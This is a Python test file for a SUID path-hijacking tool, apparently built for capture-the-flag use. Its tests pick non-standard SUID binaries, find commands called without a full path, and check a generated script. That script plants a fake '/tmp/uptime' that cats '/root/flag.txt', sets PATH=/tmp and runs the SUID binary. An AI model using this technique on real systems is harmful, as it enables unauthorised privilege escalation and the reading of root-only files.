from grin.tools.suidhijack import pick_custom_suid, bare_command, hijack_script


def test_pick_custom_suid_excludes_standard():
    find_out = ("/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/mount\n/usr/local/bin/syscheck\n"
                "/usr/bin/su\n/bin/ping\n")
    custom = pick_custom_suid(find_out)
    assert "/usr/local/bin/syscheck" in custom
    assert "/usr/bin/sudo" not in custom and "/usr/bin/passwd" not in custom


def test_bare_command_finds_relative_call():
    # strings of a binary that does system("uptime")
    strings_out = "setuid\nsystem\nuptime\n/lib64/ld-linux-x86-64.so.2\nGLIBC_2.2.5\n"
    assert bare_command(strings_out) == "uptime"


def test_bare_command_none_when_only_absolute():
    assert bare_command("system\n/usr/bin/uptime\nGLIBC_2.34\n") is None


def test_hijack_script_writes_planted_command_and_runs_suid():
    s = hijack_script("/usr/local/bin/syscheck", "uptime", "/root/flag.txt")
    assert "/tmp/uptime" in s
    assert "/bin/cat /root/flag.txt" in s
    assert "chmod" in s
    assert "PATH=/tmp" in s and s.rstrip().endswith("/usr/local/bin/syscheck")
